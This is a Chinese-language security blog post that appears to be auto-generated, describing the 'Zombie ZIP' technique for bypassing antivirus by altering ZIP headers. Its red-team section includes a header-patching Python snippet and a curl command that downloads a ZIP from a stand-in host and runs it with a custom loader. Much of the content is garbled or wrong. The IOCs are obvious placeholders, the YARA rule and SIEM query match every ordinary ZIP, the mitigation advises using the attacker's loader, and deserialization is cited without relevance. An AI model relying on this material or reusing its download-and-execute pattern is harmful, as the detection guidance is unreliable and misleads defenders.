---
layout: post
title:  "研究人員揭露「Zombie ZIP」技術可繞過防毒偵測，攻擊者可藉此利用壓縮檔案安裝惡意程式"
date:   2026-03-23 12:52:14 +0000
categories: [security]
severity: medium
---

# ⚠️ ZIP 檔案解析繞過技術：Zombie ZIP 攻擊分析
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Medium (CVSS 分數：6.5)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `ZIP 檔案解析`, `Deserialization`, `自訂載入器`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: ZIP 檔案的標頭欄位可以被修改，導致防毒軟體和 EDR 端點偵測工具無法正確判斷檔案內容，從而導致偵測誤判。
* **攻擊流程圖解**:
  1. 攻擊者修改 ZIP 檔案的標頭欄位。
  2. 防毒軟體和 EDR 端點偵測工具無法正確判斷檔案內容。
  3. 攻擊者使用自訂載入器解壓縮 ZIP 檔案。
  4. 惡意程式碼被執行。
* **受影響元件**: 所有使用 ZIP 檔案解析的防毒軟體和 EDR 端點偵測工具。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有自訂載入器的知識和技術。
* **Payload 建構邏輯**:

    ```
    
    python
      # 示例 Payload 結構
      zip_file = zipfile.ZipFile('example.zip', 'w')
      zip_file.writestr('example.txt', 'Hello World!')
      zip_file.close()
      
      # 修改 ZIP 檔案的標頭欄位
      with open('example.zip', 'rb') as f:
          zip_data = f.read()
      zip_data = zip_data.replace(b'PK\x03\x04', b'PK\x03\x05')
      with open('example.zip', 'wb') as f:
          f.write(zip_data)
    
    ```
  *範例指令*: 使用 `curl` 下載 ZIP 檔案，然後使用自訂載入器解壓縮。

```

bash
  curl -o example.zip http://example.com/example.zip
  ./custom_loader example.zip

```
* **繞過技術**: 攻擊者可以使用自訂載入器繞過防毒軟體和 EDR 端點偵測工具的檢測。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /example.zip |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule Zombie_ZIP {
          meta:
              description = "Detects Zombie ZIP files"
          strings:
              $zip_header = { 50 4b 03 04 }
          condition:
              $zip_header at 0
      }
    
    ```
  或者是具體的 **SIEM 查詢語法** (Splunk/Elastic)：

```

sql
  index=security sourcetype=zip_file | search zip_header="PK\x03\x04"

```
* **緩解措施**: 更新防毒軟體和 EDR 端點偵測工具，使用自訂載入器解壓縮 ZIP 檔案，並設定防毒軟體和 EDR 端點偵測工具以檢測和阻止惡意程式碼。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Deserialization (反序列化)**: 想像你有一個物件，可以被轉換成字串或二進制數據。技術上是指將字串或二進制數據轉換回物件的過程。
* **自訂載入器 (Custom Loader)**: 想像你有一個特殊的工具，可以用來解壓縮 ZIP 檔案。技術上是指一個可以用來解壓縮 ZIP 檔案的程式或工具。
* **ZIP 檔案解析 (ZIP File Parsing)**: 想像你有一個 ZIP 檔案，需要被解壓縮。技術上是指將 ZIP 檔案的內容解析成個別的檔案的過程。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.ithome.com.tw/news/174597)
- [MITRE ATT&CK 編號](https://attack.mitre.org/techniques/T1204/)


